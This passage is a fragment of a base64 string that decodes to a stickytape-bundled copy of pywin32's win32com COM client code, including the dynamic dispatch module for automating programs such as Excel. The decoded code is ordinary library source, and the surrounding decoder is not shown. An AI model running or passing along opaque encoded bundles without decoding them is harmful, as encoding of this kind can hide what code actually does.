pY3RfX1siX2Rpc3BvYmpfIl0uX19pbnRfXygqYXJncylcblxuICAgIGRlZiBfX21heWJlX19pdGVyX18oc2VsZik6XG4gICAgICAgIHJldHVybiBzZWxmLl9fZGljdF9fWyJfZGlzcG9ial8iXS5fX2l0ZXJfXygpXG5cbiAgICBkZWYgX19tYXliZV9fbGVuX18oc2VsZik6XG4gICAgICAgIHJldHVybiBzZWxmLl9fZGljdF9fWyJfZGlzcG9ial8iXS5fX2xlbl9fKClcblxuICAgIGRlZiBfX21heWJlX19ub256ZXJvX18oc2VsZik6XG4gICAgICAgIHJldHVybiBzZWxmLl9fZGljdF9fWyJfZGlzcG9ial8iXS5fX25vbnplcm9fXygpXG5cblxuIyBBIHZlcnkgc2ltcGxlIFZBUklBTlQgY2xhc3MuICBPbmx5IHRvIGJlIHVzZWQgd2l0aCBwb29ybHktaW1wbGVtZW50ZWQgQ09NXG4jIG9iamVjdHMuICBJZiBhbiBvYmplY3QgYWNjZXB0cyBhbiBhcmcgd2hpY2ggaXMgYSBzaW1wbGUgIlZBUklBTlQiLCBidXQgc3RpbGxcbiMgaXMgdmVyeSBwaWNrbHkgYWJvdXQgdGhlIGFjdHVhbCB2YXJpYW50IHR5cGUgKGVnLCBpc25cJ3QgaGFwcHkgd2l0aCBhIFZUX0k0LFxuIyB3aGljaCBpdCB3b3VsZCBnZXQgZnJvbSBhIFB5dGhvbiBpbnRlZ2VyKSwgeW91IGNhbiB1c2UgdGhpcyB0byBmb3JjZSBhXG4jIHBhcnRpY3VsYXIgVlQuXG5jbGFzcyBWQVJJQU5UKG9iamVjdCk6XG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIHZ0LCB2YWx1ZSk6XG4gICAgICAgIHNlbGYudmFyaWFudHR5cGUgPSB2dFxuICAgICAgICBzZWxmLl92YWx1ZSA9IHZhbHVlXG5cbiAgICAjIFwndmFsdWVcJyBpcyBhIHByb3BlcnR5IHNvIHdoZW4gc2V0IGJ5IHB5dGhvbmNvbSBpdCBnZXRzIGFueSBtYWdpYyB3cmFwcGluZ1xuICAgICMgd2hpY2ggbm9ybWFsbHkgaGFwcGVucyBmb3IgcmVzdWx0IG9iamVjdHNcbiAgICBkZWYgX2dldF92YWx1ZShzZWxmKTpcbiAgICAgICAgcmV0dXJuIHNlbGYuX3ZhbHVlXG5cbiAgICBkZWYgX3NldF92YWx1ZShzZWxmLCBuZXd2YWwpOlxuICAgICAgICBzZWxmLl92YWx1ZSA9IF9nZXRfZ29vZF9vYmplY3RfKG5ld3ZhbClcblxuICAgIGRlZiBfZGVsX3ZhbHVlKHNlbGYpOlxuICAgICAgICBkZWwgc2VsZi5fdmFsdWVcblxuICAgIHZhbHVlID0gcHJvcGVydHkoX2dldF92YWx1ZSwgX3NldF92YWx1ZSwgX2RlbF92YWx1ZSlcblxuICAgIGRlZiBfX3JlcHJfXyhzZWxmKTpcbiAgICAgICAgcmV0dXJuICJ3aW4zMmNvbS5jbGllbnQuVkFSSUFOVCglciwgJXIpIiAlIChzZWxmLnZhcmlhbnR0eXBlLCBzZWxmLl92YWx1ZSlcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCd3aW4zMmNvbS9jbGllbnQvZHluYW1pYy5weScsIGInIiIiU3VwcG9ydCBmb3IgZHluYW1pYyBDT00gY2xpZW50IHN1cHBvcnQuXG5cbkludHJvZHVjdGlvblxuIER5bmFtaWMgQ09NIGNsaWVudCBzdXBwb3J0IGlzIHRoZSBhYmlsaXR5IHRvIHVzZSBhIENPTSBzZXJ2ZXIgd2l0aG91dFxuIHByaW9yIGtub3dsZWRnZSBvZiB0aGUgc2VydmVyLiAgVGhpcyBjYW4gYmUgdXNlZCB0byB0YWxrIHRvIGFsbW9zdCBhbGxcbiBDT00gc2VydmVycywgaW5jbHVkaW5nIG11Y2ggb2YgTVMgT2ZmaWNlLlxuXG4gSW4gZ2VuZXJhbCwgeW91IHNob3VsZCBub3QgdXNlIHRoaXMgbW9kdWxlIGRpcmVjdGx5IC0gc2VlIGJlbG93LlxuXG5FeGFtcGxlXG4gPj4+IGltcG9ydCB3aW4zMmNvbS5jbGllbnRcbiA+Pj4geGwgPSB3aW4zMmNvbS5jbGllbnQuRGlzcGF0Y2goIkV4Y2VsLkFwcGxpY2F0aW9uIilcbiAjIFRoZSBsaW5lIGFib3ZlIGludm9rZXMgdGhlIGZ1bmN0aW9uYWxpdHkgb2YgdGhpcyBjbGFzcy5cbiAjIHhsIGlzIG5vdyBhbiBvYmplY3Qgd2UgY2FuIHVzZSB0byB0YWxrIHRvIEV4Y2VsLlxuID4+PiB4bC5WaXNpYmxlID0gMSAjIFRoZSBFeGNlbCB3aW5kb3cgYmVjb21lcyB2aXNpYmxlLlxuXG4iIiJcbmltcG9ydCBzeXNcbmltcG9ydCB0cmFjZWJhY2tcbmltcG9ydCB0eXBlc1xuXG5pbXBvcnQgcHl0aG9uY29tXG5pbXBvcnQgd2luZXJyb3JcbmZyb20gLiBpbXBvcnQgYnVpbGRcblxuZnJvbSBweXdpbnR5cGVzIGltcG9ydCBJSURUeXBlXG5cbmltcG9ydCB3aW4zMmNvbS5jbGllbnQgICMgTmVlZGVkIGFzIGNvZGUgd2UgZXZhbCgpIHJlZmVyZW5jZXMgaXQuXG5cbmRlYnVnZ2luZyA9IDAgICMgR2VuZXJhbCBkZWJ1Z2dpbmdcbmRlYnVnZ2luZ19hdHRyID0gMCAgIyBEZWJ1Z2dpbmcgZHluYW1pYyBhdHRyaWJ1dGUgbG9va3Vwcy5cblxuTENJRCA9IDB4MFxuXG4jIFRoZXNlIGVycm9ycyBnZW5lcmFsbHkgbWVhbiB0aGUgcHJvcGVydHkgb3IgbWV0aG9kIGV4aXN0cyxcbiMgYnV0IGNhblwndCBiZSB1c2VkIGluIHRoaXMgY29udGV4dCAtIGVnLCBwcm9wZXJ0eSBpbnN0ZWFkIG9mIGEgbWV0aG9kLCBldGMuXG4jIFVzZWQgdG8gZGV0ZXJtaW5lIGlmIHdlIGhhdmUgYSByZWFsIGVycm9yIG9yIG5vdC5cbkVSUk9SU19CQURfQ09OVEVYVCA9IFtcbiAgICB3aW5lcnJvci5ESVNQX0VfTUVNQkVSTk9URk9VTkQsXG4gICAgd2luZXJyb3IuRElTUF9FX0JBRFBBUkFNQ09VTlQsXG4gICAgd2luZXJyb3IuRElTUF9FX1BBUkFNTk9UT1BUSU9OQUwsXG4gICAgd2luZXJyb3IuRElTUF9FX1RZUEVNSVNNQVRDSCxcbiAgICB3aW5lcnJvci5FX0lOVkFMSURBUkcsXG5dXG5cbkFMTF9JTlZPS0VfVFlQRVMgPSBbXG4gICAgcHl0aG9uY29tLklOVk9LRV9QUk9QRVJUWUdFVCxcbiAgICBweXRob25jb20uSU5WT0tFX1BST1BFUlRZUFVULFxuICAgIHB5dGhvbmNvbS5JTlZPS0VfUFJPUEVSVFlQVVRSRUYsXG4gICAgcHl0aG9uY29tLklOVk9LRV9GVU5DLFxuXVxuXG5cbmRlZiBkZWJ1Z19wcmludCgqYXJncyk6XG4gICAgaWYgZGVidWdnaW5nOlxuICAgICAgICBmb3IgYXJnIGluIGFyZ3M6XG4gICAgICAgICAgICBwcmludChhcmcsIGVuZD0iICIpXG4gICAgICAgIHByaW50KClcblxuXG5kZWYgZGVidWdfYXR0cl9wcmludCgqYXJncyk6XG4gICAgaWYgZGVidWdnaW5nX2F0dHI6XG4gICAgICAgIGZvciBhcmcgaW4gYXJnczpcbiAgICAgICAgICAgIHByaW50KGFyZywgZW5kPSIgIilcbiAgICAgICAgcHJpbnQoKVxuXG5cbmRlZiBNYWtlTWV0aG9kKGZ1bmMsIGluc3QsIGNscyk6XG4gICAgcmV0dXJuIHR5cGVzLk1ldGhvZFR5cGUoZnVuYywgaW5zdClcblxuXG4jIGdldCB0aGUgdHlwZSBvYmplY3RzIGZvciBJRGlzcGF0Y2ggYW5kIElVbmtub3duXG5QeUlEaXNwYXRjaFR5cGUgPSBweXRob25jb20uVHlwZUlJRHNbcHl0aG9uY29tLklJRF9JRGlzcGF0Y2hdXG5QeUlVbmtub3duVHlwZSA9IHB5dGhvbmNvbS5UeXBlSUlEc1tweXRob25jb20uSUlEX0lVbmtub3duXVxuXG5fR29vZERpc3BhdGNoVHlwZXMgPSAoc3RyLCBJSURUeXBlKVxuX2RlZmF1bHREaXNwYXRjaEl0ZW0gPSBidWlsZC5EaXNwYXRjaEl0ZW1cblxuXG5kZWYgX0dldEdvb2REaXNwYXRjaChJRGlzcGF0Y2gsIGNsc2N0eD1weXRob25jb20uQ0xTQ1RYX1NFUlZFUik6XG4gICAgIyBxdWljayByZXR1cm4gZm9yIG1vc3QgY29tbW9uIGNhc2VcbiAgICBpZiBpc2luc3RhbmNlKElEaXNwYXRjaCwgUHlJRGlzcGF0Y2hUeXBlKTpcbiAgICAgICAgcmV0dXJuIElEaXNwYXRjaFxuICAgIGlmIGlzaW5zdGFuY2UoSURpc3BhdGNoLCBfR29vZERpc3BhdGNoVHlwZXMpOlxuICAgICAgICB0cnk6XG4gICAgICAgICAgICBJRGlzcGF0Y2ggPSBweXRob25jb20uY29ubmVjdChJRGlzcGF0Y2gpXG4gICAgICAgIGV4Y2VwdCBweXRob25jb20ub2xlX2Vycm9yOlxuICAgICAgICAgICAgSURpc3BhdGNoID0gcHl0aG9uY29tLkNvQ3JlYXRlSW5zdGFuY2UoXG4gICAgICAgICAgICAgICAgSURpc3BhdGNoLCBOb25lLCBjbHNjdHgsIHB5dGhvbmNvbS5JSURfSURpc3BhdGNoXG4gICAgICAgICAgICApXG4gICAgZWxzZTpcbiAgICAgICAgIyBtYXkgYWxyZWFkeSBiZSBhIHdyYXBwZWQgY2xhc3MuXG4gICAgICAgIElEaXNwYXRjaCA9IGdldGF0dHIoSURpc3BhdGNoLCAiX29sZW9ial8iLCBJRGlzcGF0Y2gpXG4gICAgcmV0dXJuIElEaXNwYXRjaFxuXG5cbmRlZiBfR2V0R29vZERpc3BhdGNoQW5kVXNlck5hbWUoSURpc3BhdGNoLCB1c2VyTmFtZSwgY2xzY3R4KTpcbiAgICAjIEdldCBhIGRpc3BhdGNoIG9iamVjdCwgYW5kIGEgXCd1c2VyIG5hbWVcJyAoaWUsIHRoZSBuYW1lIGFzXG4gICAgIyBkaXNwbGF5ZWQgdG8gdGhlIHVzZXIgaW4gcmVwcigpIGV0Yy5cbiAgICBpZiB1c2VyTmFtZSBpcyBOb25lOlxuICAgICAgICBpZiBpc2luc3RhbmNlKElEaXNwYXRjaCwgc3RyKTpcbiAgICAgICAgICAgIHVzZXJOYW1lID0gSURpc3BhdGNoXG4gICAgICAgICMjID8/PyBlbHNlIHVzZXJOYW1lIHJlbWFpbnMgTm9uZSA/Pz9cbiAgICBlbHNlOlxuICAgICAgICB1c2VyTmFtZSA9IHN0cih1c2VyTmFtZSlcbiAgICByZXR1cm4gKF9HZXRHb29kRGlzcGF0Y2goSURpc3BhdGNoLCBjbHNjdHgpLCB1c2VyTmFtZSlcblxuXG5kZWYgX0dldERlc2NJbnZva2VUeXBlKGVudHJ5LCBpbnZva2VfdHlwZSk6XG4gICAgIyBkZXRlcm1pbmUgdGhlIHdGbGFncyBhcmd1bWVudCBwYXNzZWQgYXMgaW5wdXQgdG8gSURpc3BhdGNoOjpJbnZva2VcbiAgICAjIE9ubHkgZXZlciBjYWxsZWQgYnkgX19nZXRhdHRyX18gYW5kIF9fc2V0YXR0cl9fIGZyb20gZHluYW1pYyBvYmplY3RzIVxuICAgICMgKiBgZW50cnlgIGlzIGEgTWFwRW50cnkgd2l0aCB3aGF0ZXZlciB0eXBlaW5mbyB3ZSBoYXZlIGFib3V0IHRoZSBwcm9wZXJ0eSB3ZSBhcmUgZ2V0dGluZy9zZXR0aW5nLlxuICAgICMgKiBgaW52b2tlX3R5cGVgIGlzIGVpdGhlciBJTlZPS0VfUFJPUEVSVFlHRVQgfCBJTlZPS0VfUFJPUEVSVFlTRVQgYW5kIHJlYWxseSBqdXN0XG4gICAgIyAgIG1lYW5zICJjYWxsZWQgYnkgX19nZXRhdHRyX18iIG9yICJjYWxsZWQgYnkgX19zZXRhdHRyX18iXG4gICAgaWYgbm90IGVudHJ5IG9yIG5vdCBlbnRyeS5kZXNjOlxuICAgICAgICByZXR1cm4gaW52b2tlX3R5cGVcblxuICAgIGlmIGVudHJ5LmRlc2MuZGVzY2tpbmQgPT0gcHl0aG9uY29tLkRFU0NLSU5EX1ZBUkRFU0M6XG4gICAgICAgIHJldHVybiBpbnZva2VfdHlwZVxuXG4gICAgIyBTbyBpdFwncyBhIEZVTkNERVNDIC0ganVzdCB1c2Ugd2hhdCBpdCBzcGVjaWZpZXMuXG4gICAgcmV0dXJuIGVudHJ5LmRlc2MuaW52a2luZFxuXG5cbmRlZiBEaXNwYXRjaChcbiAgICBJRGlzcGF0Y2gsXG4gICAgdXNlck5hbWU9Tm9uZSxcbiAgICBjcmVhdGVDbGFzcz1Ob25lLFxuICAgIHR5cGVpbmZvPU5vbmUsXG4gICAgVW5pY29kZVRvU3RyaW5nPU5vbmUsXG4gICAgY2xzY3R4PXB5dGhvbmNvbS5DTFNDVFhfU0VSVkVSLFxuKTpcbiAgICBhc3NlcnQgVW5pY29kZVRvU3RyaW5nIGlzIE5vbmUsICJ0aGlzIGlzIGRlcHJlY2F0ZWQgYW5kIHdpbGwgZ28gYXdheSJcbiAgICBJRGlzcGF0Y2gsIHVzZXJOYW1lID0gX0dldEdvb2REaXNwYXRjaEFuZFVzZXJOYW1lKElEaXNwYXRjaCwgdXNlck5hbWUsIGNsc2N0eClcbiAgICBpZiBjcmVhdGVDbGFzcyBpcyBOb25lOlxuICAgICAgICBjcmVhdGVDbGFzcyA9IENEaXNwYXRjaFxuICAgIGxhenlkYXRhID0gTm9uZVxuICAgIHRyeTpcbiAgICAgICAgaWYgdHlwZWluZm8gaXMgTm9uZTpcbiAgICAgICAgICAgIHR5cGVpbmZvID0gSURpc3BhdGNoLkdldFR5cGVJbmZvKClcbiAgICAgICAgaWYgdHlwZWluZm8gaXMgbm90IE5vbmU6XG4gICAgICAgICAgICB0cnk6XG4gICAgICAgICAgICAgICAgIyB0cnkgZm9yIGEgdHlwZWNvbXBcbiAgICAgICAgICAgICAgICB0eXBlY29tcCA9IHR5cGVpbmZvLkdldFR5cGVDb21wKClcbiAgICAgICAgICAgICAgICBsYXp5ZGF0YSA9IHR5cGVpbmZvLCB0eXBlY29tcFxuICAgICAgICAgICAgZXhjZXB0IHB5dGhvbmNvbS5jb21fZXJyb3I6XG4gICAgICAgICAgICAgICAgcGFzc1xuICAgIGV4Y2VwdCBweXRob25jb20uY29tX2Vycm9yOlxuICAgICAgICB0eXBlaW5mbyA9IE5vbmVcbiAgICBvbGVyZXByID0gTWFrZU9sZVJlcHIoSURpc3BhdGNoLCB0eXBlaW5mbywgbGF6eWRhdGEpXG4gICAgcmV0dXJuIGNyZWF0ZUNsYXNzKElEaXNwYXRjaCwgb2xlcmVwciwgdXNlck5hbWUsIGxhenlkYXRhPWxhenlkYXRhKVxuXG5cbmRlZiBNYWtlT2xlUmVwcihJRGlzcGF0Y2gsIHR5cGVpbmZvLCB0eXBlY29tcCk6XG4gICAgb2xlcmVwciA9IE5vbmVcbiAgICBpZiB0eXBlaW5mbyBpcyBub3QgTm9uZTpcbiAgICAgICAgdHJ5OlxuICAgICAgICAgICAgYXR0ciA9IHR5cGVpbmZvLkdldFR5cGVBdHRyKClcbiAgICAgICAgICAgICMgSWYgdGhlIHR5cGUgaW5mbyBpcyBhIHNwZWNpYWwgRFVBTCBpbnRlcmZhY2UsIG1hZ2ljYWxseSB0dXJuIGl0IGludG9cbiAgICAgICAgICAgICMgYSBESVNQQVRDSCB0eXBlaW5mby5cbiAgICAgICAgICAgIGlmIChcbiAgICAgICAgICAgICAgICBhdHRyWzVdID09IHB5dGhvbmNvbS5US0lORF9JTlRFUkZBQ0VcbiAgICAgICAgICAgICAgICBhbmQgYXR0clsxMV0gJiBweXRob25jb20uVFlQRUZMQUdfRkRVQUxcbiAgICAgICAgICAgICk6XG4gICAgICAgICAgICAgICAgIyBHZXQgY29ycmVzcG9uZGluZyBEaXNwIGludGVyZmFjZTtcbiAgICAgICAgICAgICAgICAjIC0xIGlzIGEgc3BlY2lhbCB2YWx1ZSB3aGljaCBkb2VzIHRoaXMgZm9yIHVzLlxuICAgICAgICAgICAgICAgIGhyZWYgPSB0eXBlaW5mby5HZXRSZWZUeXBlT2ZJbXBsVHlwZSgtMSlcbiAgICAgICAgICAgICAgICB0eXBlaW5mbyA9IHR5cGVpbmZvLkdldFJlZlR5cGVJbmZvKGhyZWYpXG4gICAgICAgICAgICAgICAgYXR0ciA9IHR5cGVpbmZvLkdldFR5cGVBdHRyKClcbiAgICAgICAgICAgIGlmIHR5cGVjb21wIGlzIE5vbmU6XG4gICAgICAgICAgICAgICAgb2xlcmVwciA9IGJ1aWxkLkRpc3BhdGNoSXRlbSh0eXBlaW5mbywgYXR0ciwgTm9uZSwgMClcbiAgICAgICAgICAgIGVsc2U6XG4gICAgICAgICAgICAgICAgb2xlcmVwciA9IGJ1aWxkLkxhenlEaXNwYXRjaEl0ZW0oYXR0ciwgTm9uZSlcbiAgICAgICAgZXhjZXB0IHB5dGhvbmNvbS5vbGVfZXJyb3I6XG4gICAgICAgICAgICBwYXNzXG4gICAgaWYgb2xlcmVwciBpcyBOb25lOlxuICAgICAgICBvbGVyZXByID0gYnVpbGQuRGlzcGF0Y2hJdGVtKClcbiAgICByZXR1cm4gb2xlcmVwclxuXG5cbmRlZiBEdW1iRGlzcGF0Y2goXG4gICAgSURpc3BhdGNoLFxuICAgIHVzZXJOYW1lPU5vbmUsXG4gICAgY3JlYXRlQ2xhc3M9Tm9uZSxcbiAgICBVbmljb2RlVG9TdHJpbmc9Tm9uZSxcbiAgICBjbHNjdHg9cHl0aG9uY29tLkNMU0NUWF9TRVJWRVIsXG4pOlxuICAgICJEaXNwYXRjaCB3aXRoIG5vIHR5cGUgaW5mbyJcbiAgICBhc3NlcnQgVW5pY29kZVRvU3RyaW5nIGlzIE5vbmUsICJ0aGlzIGlzIGRlcHJlY2F0ZWQgYW5kIHdpbGwgZ28gYXdheSJcbiAgICBJRGlzcGF0Y2gsIHVzZXJOYW1lID0gX0dldEdvb2REaXNwYXRjaEFuZFVzZXJOYW1lKElEaXNwYXRjaCwgdXNlck5hbWUsIGNsc2N0eClcbiAgICBpZiBjcmVhdGVDbGFzcyBpcyBOb25lOlxuICAgICAgICBjcmVhdGVDbGFzcyA9IENEaXNwYXRjaFxuICAgIHJldHVybiBjcmVhdGVDbGFzcyhJRGlzcGF0Y2gsIGJ1aWxkLkRpc3BhdGNoSXRlbSgpLCB1c2VyTmFtZSlcblxuXG5jbGFzcyBDRGlzcGF0Y2g6XG4gICAgZGVmIF9faW5pdF9fKFxuICAgICAgICBzZWxmLCBJRGlzcGF0Y2gsIG9sZXJlcHIsIHVzZXJOYW1lPU5vbmUsIFVuaWNvZGVUb1N0cmluZz1Ob25lLCBsYXp5ZGF0YT1Ob25lXG4gICAgKTpcbiAgICAgICAgYXNzZXJ0IFVuaWNvZGVUb1N0cmluZyBpcyBOb25lLCAidGhpcyBpcyBkZXByZWNhdGVkIGFuZCB3aWxsIGdvIGF3YXkiXG4gICAgICAgIGlmIHVzZXJOYW1lIGlzIE5vbmU6XG4gICAgICAgICAgICB1c2VyTmFtZSA9ICI8dW5rbm93bj4iXG4gICAgICAgIHNlbGYuX19kaWN0X19bIl9vbGVvYmpfIl0gPSBJRGlzcGF0Y2hcbiAgICAgICAgc2VsZi5fX2RpY3RfX1siX3VzZXJuYW1lXyJdID0gdXNlck5hbWVcbiAgICAgICAgc2VsZi5fX2RpY3RfX1siX29sZXJlcHJfIl0gPSBvbGVyZXByXG4gICAgICAgIHNlbGYuX19kaWN0X19bIl9tYXBDYWNoZWRJdGVtc18iXSA9IHt9XG4gICAgICAgIHNlbGYuX19kaWN0X19bIl9idWlsdE1ldGhvZHNfIl0gPSB7fVxuICAgICAgICBzZWxmLl9fZGljdF9fWyJfZW51bV8iXSA9IE5vbmVcbiAgICAgICAgc2VsZi5fX2RpY3RfX1siX3VuaWNvZGVfdG9fc3RyaW5nXyJdID0gTm9uZVxuICAgICAgICBzZWxmLl9fZGljdF9fWyJfbGF6eWRhdGFfIl0gPSBsYXp5ZGF0YVxuXG4gICAgZGVmIF9fY2FsbF9fKHNlbGYsICphcmdzKTpcbiAgICAgICAgIlByb3ZpZGUgXCdkZWZhdWx0IGRpc3BhdGNoXCcgQ09NIGZ1bmN0aW9uYWxpdHkgLSBhbGxvdyBpbnN0YW5jZSB0byBiZSBjYWxsZWQiXG4gICAgICAgIGlmIHNlbGYuX29sZXJlcHJfLmRlZmF1bHREaXNwYXRjaE5hbWU6XG4gICAgICAgICAgICBpbnZraW5kLCBkaXNwaWQgPSBzZWxmLl9maW5kX2Rpc3BhdGNoX3R5cGVfKFxuICAgICAgICAgICAgICAgIHNlbGYuX29sZXJlcHJfLmRlZmF1bHREaXNwYXRjaE5hbWVcbiAgICAgICAgICAgIClcbiAgICAgICAgZWxzZTpcbiAgICAgICAgICAgIGludmtpbmQsIGRpc3BpZCA9IChcbiAgICAgICAgICAgICAgICBweXRob25jb20uRElTUEFUQ0hfTUVUSE9EIHwgcHl0aG9uY29tLkRJU1BBVENIX1BST1BFUlRZR0VULFxuICAgICAgICAgICAgICAgIHB5dGhvbmNvbS5ESVNQSURfVkFMVUUsXG4gICAgICAgICAgICApXG4gICAgICAgIGlmIGludmtpbmQgaXMgbm90IE5vbmU6XG4gICAgICAgICAgICBhbGxBcmdzID0gKGRpc3BpZCwgTENJRCwgaW52a2luZCwgMSkgKyBhcmdzXG4gICAgICAgICAgICByZXR1cm4gc2VsZi5fZ2V0X2dvb2Rfb2JqZWN0XyhcbiAgICAgICAgICAgICAgICBzZWxmLl9vbGVvYmpfLkludm9rZSgqYWxsQXJncyksIHNlbGYuX29sZXJlcHJfLmRlZmF1bHREaXNwYXRjaE5hbWUsIE5vbmVcbiAgICAgICAgICAgIClcbiAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJUaGlzIGRpc3BhdGNoIG9iamVjdCBkb2VzIG5vdCBkZWZpbmUgYSBkZWZhdWx0IG1ldGhvZCIpXG5cbiAgICBkZWYgX19ib29sX18oc2VsZik6XG4gICAgICAgIHJldHVybiBUcnVlICAjIGllICJpZiBvYmplY3Q6IiBzaG91bGQgYWx3YXlzIGJlICJ0cnVlIiAtIHdpdGhvdXQgdGhpcywgX19sZW5fXyBpcyB0cmllZC5cbiAgICAgICAgIyBfUG9zc2libHlfIHdhbnQgdG8gZGVmZXIgdG8gX19sZW5fXyBpZiBhdmFpbGFibGUsIGJ1dCBJbSBub3Qgc3VyZSB0aGlzIGlzXG4gICAgICAgICMgZGVzaXJhYmxlPz8/XG5cbiAgICBkZWYgX19yZXByX18oc2VsZik6XG4gICAgICAgIHJldHVybiAiPENPTU9iamVjdCAlcz4iICUgKHNlbGYuX3VzZXJuYW1lXylcblxuICAgIGRlZiBfX3N0cl9fKHNlbGYpOlxuICAgICAgICAjIF9fc3RyX18gaXMgdXNlZCB3aGVuIHRoZSB1c2VyIGRvZXMgInByaW50IG9iamVjdCIsIHNvIHdlIGdyYWNlZnVsbHlcbiAgICAgICAgIyBmYWxsIGJhY2sgdG8gdGhlIF9fcmVwcl9fIGlmIHRoZSBvYmplY3QgaGFzIG5vIGRlZmF1bHQgbWV0aG9kLlxuICAgICAgICB0cnk6XG4gICAgICAgICAgICByZXR1cm4gc3RyKHNlbGYuX19jYWxsX18oKSlcbiAgICAgICAgZXhjZXB0IHB5dGhvbmNvbS5jb21fZXJyb3IgYXMgZGV0YWlsczpcbiAgICAgICAgICAgIGlmIGRldGFpbHMuaHJlc3VsdCBub3QgaW4gRVJST1JTX0JBRF9DT05URVhUOlxuICAgICAgICAgICAgICAgIHJhaXNlXG4gICAgICAgICAgICByZXR1cm4gc2VsZi5fX3JlcHJfXygpXG5cbiAgICBkZWYgX19kaXJfXyhzZWxmKTpcbiAgICAgICAgbHN0ID0gbGlzdChzZWxmLl9fZGljdF9fLmtleXMoKSkgKyBkaXIoc2VsZi5fX2NsYXNzX18pICsgc2VsZi5fZGlyX29sZV8oKVxuICAgICAgICB0cnk6XG4gICAgICAgICAgICBsc3QgKz0gW3AuTmFtZSBmb3IgcCBpbiBzZWxmLlByb3BlcnRpZXNfXVxuICAgICAgICBleGNlcHQgQXR0cmlidXRlRXJyb3I6XG4gICAgICAgICAgICBwYXNzXG4gICAgICAgIHJldHVybiBsaXN0KHNldChsc3QpKVxuXG4gICAgZGVmIF9kaXJfb2xlXyhzZWxmKTpcbiAgICAgICAgaXRlbXNfZGljdCA9IHt9XG4gICAgICAgIGZvciBpVEkgaW4gcmFuZ2UoMCwgc2VsZi5fb2xlb2JqXy5HZXRUeXBlSW5mb0NvdW50KCkpOlxuICAgICAgICAgICAgdHlwZUluZm8gPSBzZWxmLl9vbGVvYmpfLkdldFR5cGVJbmZvKGlUSSlcbiAgICAgICAgICAgIHNlbGYuX1VwZGF0ZVdpdGhJVHlwZUluZm9fKGl0ZW1zX2RpY3QsIHR5cGVJbmZvKVxuICAgICAgICByZXR1cm4gbGlzdChpdGVtc19kaWN0LmtleXMoKSlcblxuICAgIGRlZiBfVXBkYXRlV2l0aElUeXBlSW5mb18oc2VsZiwgaXRlbXNfZGljdCwgdHlwZUluZm8pOlxuICAgICAgICB0eXBlSW5mb3MgPSBbdHlwZUluZm9dXG4gICAgICAgICMgc3VwcHJlc3MgSURpc3BhdGNoIGFuZCBJVW5rbm93biBtZXRob2RzXG4gICAgICAgIGluc3BlY3RlZElJRHMgPSB7cHl0aG9uY29tLklJRF9JRGlzcGF0Y2g6IE5vbmV9XG5cbiAgICAgICAgd2hpbGUgbGVuKHR5cGVJbmZvcykgPiAwOlxuICAgICAgICAgICAgdHlwZUluZm8gPSB0eXBlSW5mb3MucG9wKClcbiAgICAgICAgICAgIHR5cGVBdHRyID0gdHlwZUluZm8uR2V0VHlwZUF0dHIoKVxuXG4gICAgICAgICAgICBpZiB0eXBlQXR0ci5paWQgbm90IGluIGluc3BlY3RlZElJRHM6XG4gICAgICAgICAgICAgICAgaW5zcGVjdGVkSUlEc1t0eXBlQXR0ci5paWRdID0gTm9uZVxuICAgICAgICAgICAgICAgIGZvciBpRnVuIGluIHJhbmdlKDAsIHR5cGVBdHRyLmNGdW5jcyk6XG4gICAgICAgICAgICAgICAgICAgIGZ1bkRlc2MgPSB0eXBlSW5mby5HZXRGdW5jRGVzYyhpRnVuKVxuICAgICAgICAgICAgICAgICAgICBmdW5OYW1lID0gdHlwZUluZm8uR2V0TmFtZXMoZnVuRGVzYy5tZW1pZClbMF1cbiAgICAgICAgICAgICAgICAgICAgaWYgZnVuTmFtZSBub3QgaW4gaXRlbXNfZGljdDpcbiAgICAgICAgICAgICAgICAgICAgICAgIGl0ZW1zX2RpY3RbZnVuTmFtZV0gPSBOb25lXG5cbiAgICAgICAgICAgICAgICAjIEluc3BlY3QgdGhlIHR5cGUgaW5mbyBvZiBhbGwgaW1wbGVtZW50ZWQgdHlwZXNcbiAgICAgICAgICAgICAgICAjIEUuZy4gSVNoZWxsRGlzcGF0Y2g1IGltcGxlbWVudHMgSVNoZWxsRGlzcGF0Y2g0IHdoaWNoIGltcGxlbWVudHMgSVNoZWxsRGlzcGF0Y2gzIC4uLlxuICAgICAgICAgICAgICAgIGZvciBpSW1wbFR5cGUgaW4gcmFuZ2UoMCwgdHlwZUF0dHIuY0ltcGxUeXBlcyk6XG4gICAgICAgICAgICAgICAgICAgIGlSZWZUeXBlID0gdHlwZUluZm8uR2V0UmVmVHlwZU9mSW1wbFR5cGUoaUltcGxUeXBlKVxuICAgICAgICAgICAgICAgICAgICByZWZUeXBlSW5mbyA9IHR5cGVJbmZvLkdldFJlZlR5cGVJbmZvKGlSZWZUeXBlKVxuICAgICAgICAgICAgICAgICAgICB0eXBlSW5mb3MuYXBwZW5kKHJlZlR5cGVJbmZvKVxuXG4gICAgIyBEZWxlZ2F0ZSBjb21wYXJpc29uIHRvIHRoZSBvbGVvYmpzLCBhcyB0aGV5IGtub3cgaG93IHRvIGRvIGlkZW50aXR5LlxuICAgIGRlZiBfX2VxX18oc2VsZiwgb3RoZXIpOlxuICAgICAgICBvdGhlciA9IGdldGF0dHIob3RoZXIsICJfb2xlb2JqXyIsIG90aGVyKVxuICAgICAgICByZXR1cm4gc2VsZi5fb2xlb2JqXyA9PSBvdGhlclxuXG4gICAgZGVmIF9fbmVfXyhzZWxmLCBvdGhlcik6XG4gICAgICAgIG90aGVyID0gZ2V0YXR0cihvdGhlciwgIl9vbGVvYmpfIiwgb3RoZXIpXG4gICAgICAgIHJldHVybiBzZWxmLl9vbGVvYmpfICE9IG90aGVyXG5cbiAgICBkZWYgX19pbnRfXyhzZWxmKTpcbiAgICAgICAgcmV0dXJuIGludChzZWxmLl9fY2FsbF9fKCkpXG5cbiAgICBkZWYgX19sZW5fXyhzZWxmKTpcbiAgICAgICAgaW52a2luZCwgZGlzcGlkID0gc2VsZi5fZmluZF9kaXNwYXRjaF90eXBlXygiQ291bnQiKVxuICAgICAgICBpZiBpbnZraW5kOlxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX29sZW9ial8uSW52b2tlKGRpc3BpZCwgTENJRCwgaW52a2luZCwgMSlcbiAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJUaGlzIGRpc3BhdGNoIG9iamVjdCBkb2VzIG5vdCBkZWZpbmUgYSBDb3VudCBtZXRob2QiKVxuXG4gICAgZGVmIF9OZXdFbnVtKHNlbGYpOlxuI